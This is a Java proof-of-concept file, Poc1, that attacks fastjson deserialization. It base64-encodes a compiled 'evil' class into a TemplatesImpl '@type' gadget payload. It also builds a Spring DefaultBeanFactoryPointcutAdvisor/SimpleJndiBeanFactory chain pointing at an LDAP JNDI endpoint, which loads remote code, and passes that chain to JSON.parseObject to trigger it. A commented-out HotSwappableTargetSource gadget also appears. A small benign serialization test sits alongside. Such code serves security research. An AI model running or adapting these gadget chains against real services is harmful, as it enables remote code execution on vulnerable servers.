package person;

/**
 * Created by web on 2017/6/11.
 */
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

import org.apache.xalan.xsltc.trax.TemplatesImpl;
import org.apache.commons.io.IOUtils;

import org.apache.commons.codec.binary.Base64;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

/**
 * Created by web on 2017/4/29.
 */
public class Poc1{

    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());

    }

    public static void  test_autoTypeDeny() throws Exception {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty("file.separator");
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        final String evilClassPath = System.getProperty("user.dir") + "\\target\\classes\\person\\Test1.class";
        String evilCode = readClass(evilClassPath);
        final String NASTY_CLASS = "org.apache.xalan.xsltc.trax.TemplatesImpl";
        String text1 = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
                "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";

        System.out.println(text1);
        //String text2 = "Set[{\"@type\":\"org.springframework.aop.target.HotSwappableTargetSource\",\"static\":false,\"target\":{\"@type\":\"org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding\",\"className\":\"foo\",\"name\":\"foo\"}},{\"@type\":\"org.springframework.aop.target.HotSwappableTargetSource\"}]";
        String text2 = "Set[{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",\"beanFactory\":{\"@type\":\"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\":[\"ldap://localhost:1389/obj\"]},\"adviceBeanName\":\"ldap://localhost:1389/obj\"},{\"@type\":\"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor\",}] \n";
        //String personStr = "{'name':"+text1+",'age':19}";
        //Person obj = JSON.parseObject(personStr, Person.class, config, Feature.SupportNonPublicField);
        Object obj = JSON.parseObject(text2, Object.class, Feature.SupportNonPublicField);
        //Object obj = JSON.parseObject(text1, Object.class);
        //assertEquals(Model.class, obj.getClass());

    }
    public static void test_serilize_deserialize(){
        Person p = new Person("liming",12);
        p.setName("liming");
        p.setAge(19);
        String jsonString = JSON.toJSONString(p);
        System.out.println(jsonString);
        Person p1 = JSON.parseObject(jsonString,Person.class);
    }
    public static void main(String args[]){
        try {
            test_serilize_deserialize();
            test_autoTypeDeny();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
